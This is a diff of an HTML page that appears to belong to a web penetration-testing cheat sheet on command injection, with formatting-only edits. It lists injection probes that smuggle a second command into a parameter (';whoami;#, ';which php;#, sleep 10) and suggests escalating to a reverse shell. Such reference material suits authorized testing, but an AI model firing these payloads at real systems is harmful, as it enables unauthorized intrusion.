@@ -33,10 +33,11 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>COMMON TEST</summary>
-<p>DESCRIPTION: </p> Collection of different test to confirm the vulnerability. 
+<p><b>DESCRIPTION: </b>Collection of different test to confirm the vulnerability. 
 
 <b>C1: </b>$<mark id="CT01">';whoami;#</mark>
 <b>C2: </b>$<mark id="CT02">';which php;#</mark>
+	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CT02')">.C2.</button>
 
 <b>NOTE: </b>If possible, try any command to get some kind of reverse shell! For that check what technologies are present, change 
@@ -48,15 +49,15 @@ the technology to validate. [C2]
 <details>
 <summary>BLIND COMMAND INJECTION</summary>
 
-<b>NOTE: </b> It will be more related to behavior, similar to blind-sqli. Content in browser, cookies, etc. 
+<b>NOTE: </b>It will be more related to behavior, similar to blind-sqli. Content in browser, cookies, etc. 
 
 <details>
 <summary> COMMON ATTEMPTS </summary>
 
 <u>::: TIME DELAY</u>
 
-<b>C1: </b>$<mark id="CT03">/?q='sleep 10'</mark>
-<b>C2: </b>$<mark id="CT04">/?q='whoami'</mark>
+<b>C1: </b><mark id="CT03">/?q='sleep 10'</mark>
+<b>C2: </b><mark id="CT04">/?q='whoami'</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CT04')">.C2.</button>
 	
